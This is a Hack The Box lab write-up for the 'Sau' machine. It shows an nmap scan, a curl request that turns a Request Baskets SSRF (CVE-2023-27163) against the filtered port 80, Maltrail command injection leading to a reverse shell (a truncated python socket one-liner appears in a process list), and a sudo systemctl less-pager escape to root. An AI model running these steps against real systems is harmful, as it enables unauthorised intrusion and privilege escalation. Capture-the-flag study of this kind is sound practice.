---
title: "From Forged Requests to Pager Escapes on HTB 'Sau'"
seo_title: "Hack The Box 'Sau' Write-up: A Step-by-Step Guide"
date: 2025-11-30
layout: single
hideToc: false
tags: ["linux", "easy", "hackthebox", "ssrf", "web", "rce", "systemctl"]
summary: "Easy rated linux box from hackthebox comprising of an SSRF leading to RCE for foothold, and a systemctl less pager escape for privilege escalation."
---

# Sau

![Sau.png](Sau%20bb678865c1b6490fae23bd8b15c4855e/Sau.png)

## Box Info

This was an Easy-rated Linux box created by [sau123](https://app.hackthebox.com/profile/201596). In this box, a `Server Side Request Forgery` vulnerability within the application's 'requests basket' was leveraged in conjunction with the `Unauthenticated OS Command Injection` vulnerability in Maltrail (v0.53), leading to successful foothold acquisition. Additionally, the exploitation allowed for privilege escalation using the systemctl less pager.

## Recon

### Nmap

```jsx
# Nmap 7.92 scan initiated Sun Dec  3 09:30:12 2023 as: nmap -sV -sC -vv -oN initial 10.10.11.224
Nmap scan report for 10.10.11.224
Host is up, received conn-refused (0.053s latency).
Scanned at 2023-12-03 09:30:27 EST for 93s
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE    SERVICE REASON      VERSION
22/tcp    open     ssh     syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdY38bkvujLwIK0QnFT+VOKT9zjKiPbyHpE+cVhus9r/6I/uqPzLylknIEjMYOVbFbVd8rTGzbmXKJBdRK61WioiPlKjbqvhO/YTnlkIRXm4jxQgs+xB0l9WkQ0CdHoo/Xe3v7TBije+lqjQ2tvhUY1LH8qBmPIywCbUvyvAGvK92wQpk6CIuHnz6IIIvuZdSklB02JzQGlJgeV54kWySeUKa9RoyapbIqruBqB13esE2/5VWyav0Oq5POjQWOWeiXA6yhIlJjl7NzTp/SFNGHVhkUMSVdA7rQJf10XCafS84IMv55DPSZxwVzt8TLsh2ULTpX8FELRVESVBMxV5rMWLplIA5ScIEnEMUR9HImFVH1dzK+E8W20zZp+toLBO1Nz4/Q/9yLhJ4Et+jcjTdI1LMVeo3VZw3Tp7KHTPsIRnr8ml+3O86e0PK+qsFASDNgb3yU61FEDfA0GwPDa5QxLdknId0bsJeHdbmVUW3zax8EvR+pIraJfuibIEQxZyM=
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEFMztyG0X2EUodqQ3reKn1PJNniZ4nfvqlM7XLxvF1OIzOphb7VEz4SCG6nXXNACQafGd6dIM/1Z8tp662Stbk=
|   256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICYYQRfQHc6ZlP/emxzvwNILdPPElXTjMCOGH6iejfmi
80/tcp    filtered http    no-response
55555/tcp open     unknown syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sun, 03 Dec 2023 09:01:04 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sun, 03 Dec 2023 09:00:38 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sun, 03 Dec 2023 09:00:38 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Scan shows three ports 22,80 and 55555. Port 80 was filtered and could not be accessed directly. Port 55555 was running an instance of request baskets version 1.2.1.

### SSRF in Request Basket

![Untitled](Sau%20bb678865c1b6490fae23bd8b15c4855e/Untitled.png)

Request Baskets is a web service to collects arbitrary HTTP requests and inspects them via RESTful API or simple web UI. A basic Google search reveals that this version was susceptible to the `SSRF` vulnerability, identified as `CVE-2023-27163`. 

As per the PoC, for the endpoints, the forward_url parameter is vulnerable to SSRF-

- /api/baskets/{name}
- /baskets/{name}

We designed our payload with a `forward_url` parameter that directs it to the filtered port 80.

```jsx
┌─[noob@parrot]─[~/htb/sau/notes]
└──╼ $curl http://10.10.11.224:55555/api/baskets/noobl33t -d '{"forward_url": "http://127.0.0.1:80/","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}' -v
*   Trying 10.10.11.224:55555...
* Connected to 10.10.11.224 (10.10.11.224) port 55555 (#0)
> POST /api/baskets/noobl33t HTTP/1.1
> Host: 10.10.11.224:55555
> User-Agent: curl/7.85.0
> Accept: */*
> Content-Length: 120
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 201 Created
< Content-Type: application/json; charset=UTF-8
< Date: Sun, 03 Dec 2023 09:47:43 GMT
< Content-Length: 56
< 
* Connection #0 to host 10.10.11.224 left intact
{"token":"1q14gomjug7JhUGXvFs4UkvBiWwy77XWV89nuvTD8PQm"}
```

According to the Proof of Concept (PoC), the SSRF vulnerability was exploited by visiting a particular URL. Upon accessing this URL, we were able to view the HTTP site running on port 80, which provided us with important information. Specifically, we were able to identify that Maltrail `version 0.53` was in use.

![Untitled](Sau%20bb678865c1b6490fae23bd8b15c4855e/Untitled%201.png)

### Unauthenticated OS Command Injection in Maltrail

After checking, it was discovered that this version of Maltrail is vulnerable to unauthenticated OS command injection.

```jsx
The subprocess.check_output function in mailtrail/core/http.py contains a command injection vulnerability in the params.get("username")parameter.
```

According to the article, injecting arbitrary commands in the username post parameter can lead to command injection.

![Untitled](Sau%20bb678865c1b6490fae23bd8b15c4855e/Untitled%202.png)

I listened on port 1337 and made a request using a crafted payload to confirm the vulnerability. I then hosted a web server with a malicious file to obtain a reverse shell.

![Untitled](Sau%20bb678865c1b6490fae23bd8b15c4855e/Untitled%203.png)

### Privilege Escalation

We obtained a shell as the user "puma". The first thing I checked was whether I could execute any commands with root privileges.

```jsx
puma@sau:~$ sudo -l -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:

Sudoers entry:
    RunAsUsers: ALL
    RunAsGroups: ALL
    Options: !authenticate
    Commands:
	/usr/bin/systemctl status trail.service
```

After searching for a while, I came across a vulnerability in `systemd before 247`.

This vulnerability stems from `systemd's insufficient privilege control` when the "systemctl status" command is executed. The absence of setting `LESSSECURE to 1` allows other programs to be launched from the less pager. When utilizing "sudo" to run "systemctl status," a notable security risk arises, particularly when the `terminal size is inadequate`. In such instances, the invocation of the less pager could be exploited for potential privilege escalation.

```jsx
puma@sau:~$ sudo /usr/bin/systemctl status trail.service 
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>
     Active: active (running) since Fri 2023-12-01 09:10:23 UTC; 2 days ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 894 (python3)
      Tasks: 105 (limit: 4662)
     Memory: 218.2M
     CGroup: /system.slice/trail.service
             ├─  894 /usr/bin/python3 server.py
             ├─ 1266 /bin/sh -c logger -p auth.info -t "maltrail[894]" "Failed >
             ├─ 1268 /bin/sh -c logger -p auth.info -t "maltrail[894]" "Failed >
             ├─ 1275 sh
             ├─ 1277 python3 -c import socket,os,pty;s=socket.socket(socket.AF_>
             ├─ 1278 /bin/sh
             ├─ 1283 sudo /usr/bin/systemctl status trail.service
             ├─ 1285 /usr/bin/systemctl status trail.service
             ├─ 1286 pager
             ├─ 1344 /bin/sh -c logger -p auth.info -t "maltrail[894]" "Failed >
             ├─ 1345 /bin/sh -c logger -p auth.info -t "maltrail[894]" "Failed >
             ├─ 1348 sh
             ├─ 1349 python3 -c import socket,os,pty;s=socket.socket(socket.AF_>
             ├─ 1350 /bin/sh
!/bin/bash
root@sau:/home/puma#
```

### References

[https://nvd.nist.gov/vuln/detail/CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163) 

[https://notes.sjtu.edu.cn/s/MUUhEymt7](https://notes.sjtu.edu.cn/s/MUUhEymt7#) 

[https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/](https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/) 

[https://nvd.nist.gov/vuln/detail/CVE-2023-26604](https://nvd.nist.gov/vuln/detail/CVE-2023-26604)